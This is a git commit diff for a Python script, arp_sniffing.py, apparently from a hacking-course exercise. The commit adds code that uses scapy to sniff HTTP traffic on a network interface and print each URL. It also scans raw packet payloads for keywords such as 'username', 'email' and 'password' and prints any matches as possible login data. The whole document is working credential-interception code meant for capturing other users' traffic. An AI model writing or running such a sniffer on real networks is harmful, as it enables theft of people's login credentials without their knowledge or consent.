f96f3bc74fcfbc77d5041eb5532b98f32acf79b4
Maksym Lytvynchuk <lytvynchuk.official@gmail.com>
2019-08-06 15:10:56 +0300

    add sniff

--- arp_sniffing/arp_sniffing.py
+++ arp_sniffing/arp_sniffing.py
@@ -1,14 +1,30 @@
 import scapy.all as scapy
 from scapy.layers import http
 
+
 def sniff(interface):
-    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
+def get_url(packet):
+    page = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+    return page
 
-def process_sniff_packet(packet):
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = ["login", "username", "email", "password",
+            "pass", "password1", "password2", "pass1", "pass2"]
+        for key in keywords:
+            if key in load:
+                return load
+        
+def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-        if packet.haslayer(scapy.Raw):
-            print(packet[scapy.Raw].load)
-
+        print("Url: " + get_url(packet))
+        login_info = get_login_info(packet)
+        if login_info:
+            print("[+] Possible login data: " + login_info)
+        print("")
+        
 
 sniff("en0")
